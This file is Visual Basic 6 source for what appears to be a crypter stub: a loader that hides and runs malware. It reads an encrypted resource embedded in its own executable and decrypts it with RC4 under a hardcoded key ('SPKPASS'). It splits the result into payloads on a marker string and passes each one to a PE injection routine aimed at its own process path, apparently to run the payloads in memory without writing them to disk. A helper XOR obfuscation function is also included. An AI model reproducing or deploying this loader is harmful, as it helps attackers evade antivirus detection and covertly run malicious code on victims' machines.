Attribute VB_Name = "TheMain"
'/==== API Declerations ====/
Private Declare Function FindResource Lib "kernel32" Alias "FindResourceA" (ByVal hInstance As Long, ByVal lpName As String, ByVal lpType As String) As Long
Private Declare Function LoadResource Lib "kernel32" (ByVal hInstance As Long, ByVal HandleResInfo As Long) As Long
Private Declare Function LockResource Lib "kernel32" (ByVal HandleResData As Long) As Long
Private Declare Function SizeofResource Lib "kernel32" (ByVal hInstance As Long, ByVal HandleResInfo As Long) As Long
Private Declare Function FreeResource Lib "kernel32" (ByVal HandleResData As Long) As Long
Private Declare Function GetModuleHandle Lib "kernel32" Alias "GetModuleHandleA" (ByVal lpModuleName As String) As Long
Private Declare Sub CopyMemory Lib "kernel32" Alias "RtlMoveMemory" (Destination As Any, Source As Any, ByVal Length As Long)



Private Sub Main()
'/==== Declarations ====/
Dim HandleM As Long
Dim HandleRes As Long
Dim HandleLong As Long
Dim HandleLock As Long
Dim LongSize As Long
Dim TotalBuffer As String
Dim RC4 As New clsRC4
Dim TotalFile() As String
Dim i  As Integer
Dim Injection As New PE

'/==== Set vars ====/
HandleM = GetModuleHandle(vbNullString)
HandleRes = FindResource(HandleM, 500, "53738")
HandleLong = LoadResource(HandleM, HandleRes)
HandleLock = LockResource(HandleLong)
LongSize = SizeofResource(HandleM, HandleRes)
TotalBuffer = Space(LongSize)

'/==== Calls ====/
Call CopyMemory(ByVal TotalBuffer, ByVal HandleLock, LongSize)
Call FreeResource(HandleLong)

'/==== Decrypt & Split ====/
TotalBuffer = RC4.DecryptString(TotalBuffer, "SPKPASS")
TotalFile = SplitAlter(TotalBuffer, "ITSASPLIT")

'/==== Run the file ====/

'For i = 0 To UBound(TotalFile()) Fixed 0 to 1, to not execute twice.

For i = 1 To UBound(TotalFile())
  Injection.sFunction02 StrConv(TotalFile(i), vbFromUnicode), App.Path & "\" & App.EXEName & ".exe"
Next i
'/==== End ====/
End Sub

'/==== XOR Function ====/
Public Function XOREncryption(CodeKey As String, DataIn As String) As String
    
    Dim lonDataPtr As Long
    Dim strDataOut As String
    Dim intXOrValue1 As Integer
    Dim intXOrValue2 As Integer
    

    For lonDataPtr = 1 To (Len(DataIn) / 2)

        intXOrValue1 = Val("&H" & (Mid$(DataIn, (2 * lonDataPtr) - 1, 2)))

        intXOrValue2 = Asc(Mid$(CodeKey, ((lonDataPtr Mod Len(CodeKey)) + 1), 1))
        
        strDataOut = strDataOut + Chr(intXOrValue1 Xor intXOrValue2)
    Next lonDataPtr
   XOREncryption = strDataOut
End Function
'/==== Split Function ====/
Private Function SplitAlter(ByVal Expression As String, Optional ByVal Delimiter As String, Optional ByVal Limit As Long = -1) As String()
    Dim lLastPos    As Long
    Dim lIncrement  As Long
    Dim lExpLen     As Long
    Dim lDelimLen   As Long
    Dim lUbound     As Long
    Dim svTemp()    As String
   
    lExpLen = Len(Expression)
   
    If Delimiter = vbNullString Then Delimiter = " "
    lDelimLen = Len(Delimiter)
    If Limit = 0 Then GoTo QuitHere
    If lExpLen = 0 Then GoTo QuitHere
    If InStr(1, Expression, Delimiter, vbBinaryCompare) = 0 Then GoTo QuitHere
   
    ReDim svTemp(0)
    lLastPos = 1
    lIncrement = 1
   
    Do
        If lUbound + 1 = Limit Then
            svTemp(lUbound) = Mid$(Expression, lLastPos)
            Exit Do
        End If
        lIncrement = InStr(lIncrement, Expression, Delimiter, vbBinaryCompare)
        If lIncrement = 0 Then
            If Not lLastPos = lExpLen Then
                svTemp(lUbound) = Mid$(Expression, lLastPos)
            End If
            Exit Do
        End If
        svTemp(lUbound) = Mid$(Expression, lLastPos, lIncrement - lLastPos)
        lUbound = lUbound + 1
        ReDim Preserve svTemp(lUbound)
        lLastPos = lIncrement + lDelimLen
        lIncrement = lLastPos
    Loop
   
    ReDim Preserve svTemp(lUbound)
    SplitAlter = svTemp
   
    Exit Function
   
QuitHere:
    ReDim SplitAlter(-1 To -1)
End Function



